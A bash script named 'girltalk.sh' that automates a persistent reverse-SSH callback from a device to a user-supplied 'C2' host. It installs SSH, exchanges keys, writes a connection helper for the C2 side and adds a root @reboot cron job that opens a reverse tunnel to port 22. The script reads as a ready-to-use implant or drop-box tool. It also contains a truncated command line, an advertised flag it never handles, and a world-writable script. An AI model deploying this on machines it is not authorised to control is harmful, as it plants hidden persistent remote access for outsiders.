#!/bin/bash

################################################################
#                                                              #
# Let's setup an automated reverse ssh device!                 #
#                                                              #
# Once complete, the device will automatically attempt a       #
# connection when the device reboots                           #
#                                                              #
# xoxo Hexadecim8 did this xoxo                                #
#                                                              #
################################################################

set -e

bold=$(tput bold)
normal=$(tput sgr0)

USAGE="
A bash script to automate reverse ssh tunnels. Handy for callbacks through NAT.
girltalk.sh:
  -a	Use AWS C2 infrastructure.
  -s    Use autossh method (more stable)
  -k    SSH key (full path).
  -c    C2 host.
  -u	C2 username.
  -l    Local username to use.
  -h	Help text and usage example.
usage:	 girltalk.sh -c <C2 hostname/IP> -l <local_username> -u <C2_username>
example: girltalk.sh -c host.aws.com -u ubuntu -l hatchetface -a -k ~/.ssh/amazon.keypair.pem
"

# Check if any flags were set. If not, print out help.
if [ $# -eq 0 ]; then
	echo "$USAGE"
	exit
fi

# Set flags.
while getopts "ahk:c:u:l:" FLAG
do
	case $FLAG in
		a)
			AWS=1
			;;
		k)
			KEY="$OPTARG"
			;;
		c)
			HOST=$OPTARG
			;;
		u)
			USERC2=$OPTARG
			;;
		l)
			USERLOCAL=$OPTARG
			;;
		h)	echo "$USAGE"
			exit
			;;
		*)
			echo "$USAGE"
			exit
			;;
	esac
done

# Make sure each required flag was set
if [ -z ${USERC2+x} ]; then
	echo "Remote username (-u) is not set."
	echo "$USAGE"
	exit
elif [ -z ${USERLOCAL+x} ]; then
	echo "Local username (-l) is not set."
	echo "$USAGE"
	exit
elif [ -z ${HOST+x} ]; then
	echo "Remote C2 hostname (-c) is not set."
	echo "$USAGE"
	exit
fi

# Check for connectivity
echo "${bold}### Checking For Internet ###"
if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
    echo "${bold}### IPv4 is up! ###"
    printf "\n"

# Installing deps
if (systemctl -q is-active sshd.service)
then
    echo "${bold}### SSH is Installed And Running! ###"
    printf "\n"
else
    echo "${bold}### Installing Dependencies ###"
    sudo apt update && sudo apt upgrade
    sudo apt install openssh-server
    printf "\n"
    echo "${bold}### Starting SSH Service & Enabling On Reboot ###"
    sudo systemctl start ssh && sudo systemctl enable ssh
fi
    printf "\n"

# Generate local key
    echo "${bold}### Generating 4096 keypair ###"
    ssh-keygen -b 4096
    printf "\n"

# Error checking for user input
    until id "$USERLOCAL" >/dev/null; do
        echo "Please enter your local username";
    printf "\n"
    exit
done

########################################################
# AWS infrastructure selection                         #
# Falls over to default "off" if -a is not selected.   #
#                                                      #
########################################################

if [ ${AWS} -eq 1 ]; then

# Transferring local key to C2
    echo "${bold}### Copying key to C2 host ###"
    echo "${USERLOCAL}, ${KEY}, ${USERC2}, ${HOST}"
    scp -i ${KEY} /home/${USERLOCAL}/.ssh/id_rsa.pub ${USERC2}@${HOST}:/home/${USERC2}/.ssh/
    printf "\n"

# Generating an ssh key on your C2
    ssh $HOST 'ssh-keygen'

# Creating hmu.sh, which should be run on the C2 host
    echo "${bold}### Creating & transferring remote connection script ###"
    echo "ssh-copy-id ${USERLOCAL}@localhost -p 43022 && ssh ${USERLOCAL}@localhost -p 43022" > /home/$USERLOCAL/hm$
    sudo chmod 777 /home/$USERLOCAL/hmu_$USERLOCAL.sh
    scp /home/$USERLOCAL/hmu_$USERLOCAL.sh $HOST:/root
    printf "\n"

# Setup local cron job + cleanup
    echo "${bold}### Setting up local cronjob ###"
    echo "@reboot sleep 100 && sudo ssh -f -N -R 43022:localhost:22 ${HOST}" >> cronsh
    sudo crontab cronsh
    rm cronsh
    printf "\n"

# Finishing script
    echo "${bold}### Donezo! Please reboot the machine. ###"
    exit

else
# Transferring local key to C2
    echo "${bold}### Copying key to C2 host ###"
    ssh-copy-id $HOST
    printf "\n"

# Generating an ssh key on specified C2
    ssh $HOST 'ssh-keygen'

# Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
    echo "${bold}### Creating & transferring remote connection script ###"
    echo "ssh-copy-id ${USERLOCAL}@localhost -p 43022 && ssh ${USERLOCAL}@localhost -p 43022" > /home/$USERLOCAL/hmu_$USERLOCAL.sh
    sudo chmod 777 /home/$USERLOCAL/hmu_$USERLOCAL.sh 
    scp /home/$USERLOCAL/hmu_$USERLOCAL.sh $HOST:/root
    printf "\n"

# Setup local cron job + cleanup
    echo "${bold}### Setting up local cronjob ###"
    echo "@reboot sleep 100 && sudo ssh -f -N -R 43022:localhost:22 ${HOST}" >> cronsh
    sudo crontab cronsh
    rm cronsh
    printf "\n"
    exit
fi

# Finishing script
    echo "${bold}### Donezo! Please reboot the machine. ###"

else
    echo "${bold}### Please check your network connection. ###"

fi